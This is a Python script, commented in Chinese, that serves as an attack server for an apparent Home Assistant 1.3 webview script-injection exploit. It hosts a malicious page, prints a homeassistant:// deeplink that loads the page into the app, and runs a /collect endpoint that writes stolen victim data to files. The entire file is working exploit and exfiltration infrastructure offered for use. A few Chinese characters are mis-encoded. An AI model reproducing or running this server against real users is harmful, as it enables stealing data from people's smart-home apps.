#!/usr/bin/env python3
"""
Home Assistant 1.3 - Dynamic Script Injection Risk
攻击服务器：提供恶意页面 + 数据回收

端口: 8000 HTTP 主服�?

接口:
  GET  /collect?d=<data>    统一数据回收
  GET  /exp/1.3              攻击页面
"""

import os
import time
import socket
import urllib.parse as up
from http.server import HTTPServer, BaseHTTPRequestHandler

OUT_DIR = "received"
EXP_DIR = "exp"
os.makedirs(OUT_DIR, exist_ok=True)

def _get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

LOCAL_IP = _get_local_ip()
print(f"[*] 本机IP地址: {LOCAL_IP}")
print(f"[*] 攻击页面: http://{LOCAL_IP}:8000/exp/1.3")
print(f"[*] Deeplink: homeassistant://webview?url=http://{LOCAL_IP}:8000/exp/1.3")

# ============================================================
# HTTP 服务
# ============================================================
class ExpHandler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        print(f"[{time.strftime('%H:%M:%S')}] {args[0]}")

    def do_GET(self):
        parsed = up.urlparse(self.path)
        path = parsed.path
        qs = up.parse_qs(parsed.query)

        # --- 数据回收 ---
        if path == "/collect":
            data = qs.get("d", [""])[0]
            if data:
                ts = str(int(time.time() * 1000))
                fname = f"collected_{ts}.txt"
                with open(os.path.join(OUT_DIR, fname), "w", encoding="utf-8") as f:
                    f.write(up.unquote(data))
                print(f"[+] 数据已回�?-> {fname}")
                print(f"    内容: {up.unquote(data)[:200]}")
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b"ok")
            return

        # --- 攻击页面 ---
        if path == "/exp/1.3":
            html_path = os.path.join(EXP_DIR, "1.3.html")
            if os.path.exists(html_path):
                with open(html_path, "r", encoding="utf-8") as f:
                    content = f.read()
                content = content.replace("{{LOCAL_IP}}", LOCAL_IP)
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(content.encode("utf-8"))
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"exp not found")
            return

        # --- 默认 ---
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(f"""<html><body>
<h2>Home Assistant Bridge Exploit Server</h2>
<p>IP: {LOCAL_IP}</p>
<p>攻击页面: <a href="/exp/1.3">/exp/1.3</a></p>
<p>Deeplink: <code>homeassistant://webview?url=http://{LOCAL_IP}:8000/exp/1.3</code></p>
</body></html>""".encode("utf-8"))

if __name__ == "__main__":
    port = 8000
    server = HTTPServer(("0.0.0.0", port), ExpHandler)
    print(f"[*] 服务器启�? http://0.0.0.0:{port}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] 服务器已停止")
        server.shutdown()
